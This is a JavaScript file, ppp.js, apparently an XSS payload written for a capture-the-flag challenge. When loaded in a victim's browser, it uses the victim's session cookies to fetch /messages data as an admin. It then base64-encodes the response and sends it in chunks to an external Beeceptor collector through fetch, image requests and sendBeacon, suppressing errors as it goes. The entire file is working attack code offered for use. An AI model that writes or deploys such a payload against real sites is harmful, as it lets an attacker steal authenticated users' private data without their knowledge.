// ppp.js — hosted on GitHub; will be loaded via jsDelivr CDN
// Exfil base (Beeceptor / webhook.site)
const EXFIL_BASE = "https://pepechicken.free.beeceptor.com"; // <-- yours
const CHUNK = 900; // safe URL length for most collectors

(function(){
  function b64u(s){ return btoa(unescape(encodeURIComponent(s))); }
  function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

  async function fireNoCors(url){
    try { fetch(url, { mode: "no-cors", keepalive: true }); } catch(e){}
    try { (new Image()).src = url; } catch(e){}
  }
  async function sendBeacon(path, data){
    try {
      if (navigator.sendBeacon) {
        const blob = new Blob([data], {type:"application/octet-stream"});
        navigator.sendBeacon(EXFIL_BASE + path, blob);
      }
    } catch(e){}
  }

  async function go(){
    try {
      // 1) (Optional) trigger server-side action the challenge expects
      try {
        await fetch("/visit", {
          method: "POST",
          credentials: "include",
          headers: {"Content-Type":"application/x-www-form-urlencoded"},
          body: "id=1"
        });
        await sleep(300);
      } catch(e){}

      // 2) Fetch the target data as admin
      let resp, txt = "";
      try {
        resp = await fetch("/messages?id=1", { method:"GET", credentials:"include" });
        txt = await resp.text();
      } catch(e) {
        // fallback: sometimes messages is POST JSON
        try {
          resp = await fetch("/messages", {
            method:"POST", credentials:"include",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify({id:1})
          });
          txt = await resp.text();
        } catch(e2){}
      }

      // 3) Package + encode
      const meta = { from: location.pathname + location.search, when: Date.now() };
      const payload = JSON.stringify({ meta, body: txt });
      const enc = b64u(payload);

      // 4) Send header (how many chunks)
      const parts = [];
      for (let i=0;i<enc.length;i+=CHUNK) parts.push(enc.slice(i,i+CHUNK));
      const headerPath = "/_h/" + encodeURIComponent(location.hostname + location.pathname) + "/" + parts.length;
      await fireNoCors(EXFIL_BASE + headerPath);
      await sendBeacon(headerPath, "hdr");

      // 5) Send chunks
      for (let i=0;i<parts.length;i++){
        const p = "/" + i + "/" + encodeURIComponent(parts[i]);
        await fireNoCors(EXFIL_BASE + p);
        await sendBeacon("/beacon/" + i, parts[i]);
        await sleep(120);
      }
    } catch(err){
      try { await fireNoCors(EXFIL_BASE + "/_err/" + encodeURIComponent(String(err))); } catch(e){}
      console.error("ppp.js error:", err);
    }
  }

  try { go(); } catch(e){}
})();
